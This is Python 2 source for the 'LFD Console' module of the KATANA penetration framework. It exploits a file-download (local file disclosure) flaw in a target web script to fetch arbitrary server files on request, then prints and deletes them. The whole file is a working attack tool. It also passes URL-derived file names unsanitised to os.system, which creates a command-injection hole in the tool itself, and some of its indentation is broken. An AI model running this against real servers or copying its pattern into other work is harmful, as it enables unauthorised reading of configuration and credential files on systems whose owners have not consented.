# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                       #
# Modules   : LFD Console       #
# Script by : RedToor           #
# Date      : 14/01/2016        #
# Version   : 1.0               #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                   #
from core.design import *       #
from core.Setting import *      #
from core import Errors         #
from core import help           #
from core import ping           #
import sys                      #
d=DESIGN()                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                     #
import httplib,urllib           #
import urllib2			#
import os                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaulthost=LOCAL_IP
defaultport=HTTP_PORT
defaultfile="/download.php"
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

def run(target, files, port):
	global defaulthost,defaultport,defaultfile
	defaulthost=target
	defaultport=port
	defaultfile=files
	LFDconsole(1)


def LFDconsole(run):
	global defaulthost,defaultfile,defaultport
	try:
		if run!=1:
			actions=raw_input(d.prompt("web/lfd-con"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP, DNS Target",defaulthost)
			d.descrip("patch","yes","Path file vul",defaultfile)
			d.descrip("port","no","Port service",defaultport)
			d.space()
			LFDconsole(0)
		elif actions[0:9] == "set patch":
			defaultfile=ping.update(defaultfile,actions,"patch")
			d.change("patch",defaultfile)
		elif actions[0:10] == "set target":
			defaulthost=ping.update(defaulthost,actions,"target")
			d.change("target",defaulthost)
		elif actions[0:8] == "set port":
			defaultport=ping.update(defaultport,actions,"port")
			d.change("port",defaultport)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				ping.live(defaulthost,defaultport)
				if True:
					connection = httplib.HTTPConnection(defaulthost,defaultport)
					connection.request("GET",defaultfile)
					response = connection.getresponse()
					if response.status == 200:
						print " "+Suf+" File response correctly."
						d.space()
						print "\n "+Hlp+" LFD Console help\n"
						print "  ------------------------------------------"
						print "  |"+colors[6]+"Command "+colors[0]+"| "+colors[6]+"Description"+colors[0]+"   | "+colors[6]+"Examples"+colors[0]+"      |"
						print "  ------------------------------------------"
						print "  |   get  | Download file | get index.php |" 
						print "  ------------------------------------------"
						d.space()
						command=0
						while command!="exit":
							command=raw_input(d.Client_prompt("LFD"))
							if command[:3] == "get":
								submit=command[4:]
								try:
									url = "http://"+defaulthost+defaultfile+"?"+submit
									file_name = url.split('/')[-1]
									u = urllib2.urlopen(url)
									f = open("tmp/"+file_name, 'wb')
									meta = u.info()
									try:		
										file_size = int(meta.getheaders("Content-Length")[0])
										if file_size != 0:
											print " "+Alr+" Downloading %s Bytes: %s" % (file_name, file_size)
											file_size_dl = 0
											block_sz = 8192
											while True:
												buffer = u.read(block_sz)
												if not buffer:
													break
												file_size_dl += len(buffer)
												f.write(buffer)
												status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
												status = status + chr(8)*(len(status)+1)
												print " "+Suf+" Completed "+status
											    	f.close()
												print " \n -------------------------------- File "+file_name+" Size: "+str(file_size)+" \n"
												os.system("cat 'tmp/"+file_name+"' -b -v ")
												os.system("rm 'tmp/"+file_name+"'")
												print " \n -------------------------------- File "+file_name+" Size: "+str(file_size)+" \n"
										else:
											print " "+War+" File empy or no exist."
									except:
										Errors.Errors(event=sys.exc_info(), info=url)
								except:
									Errors.Errors(event=sys.exc_info(), info=defaulthost+":"+defaultport)
					else:
						print " "+Bad+" File Not response correctly."
						d.space()
			except:
				Errors.Errors(event=sys.exc_info(), info=defaulthost+":"+defaultport)
		else:
			d.No_actions()
	except:
		Errors.Errors(event=sys.exc_info(), info=False)
	LFDconsole(0)
